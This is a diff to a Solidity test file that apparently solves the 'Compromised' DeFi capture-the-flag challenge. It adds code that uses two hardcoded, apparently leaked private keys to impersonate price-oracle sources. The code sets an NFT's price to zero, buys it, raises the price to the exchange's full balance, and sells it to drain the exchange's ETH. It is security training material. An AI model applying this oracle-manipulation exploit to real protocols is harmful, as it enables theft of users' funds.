@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,37 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 privateKey1 = uint256(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        uint256 privateKey2 = uint256(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        address address1 = vm.addr(privateKey1);
+        address address2 = vm.addr(privateKey2);
+        console.log("address1: %s", address1);
+        // address1: 0x188Ea627E3531Db590e6f1D71ED83628d1933088 - sources[0]
+        console.log("address2: %s", address2);
+        // address2: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8 - sources[1]
+
+        // Set NFT price to 0
+        vm.prank(address1);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(address2);
+        oracle.postPrice("DVNFT", 0);
+
+        // Buy NFT
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE - 1}();
+
+        // Set NFT price to 999 ETH
+        vm.prank(address1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(address2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // Sell NFT
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
     }
 
     /**
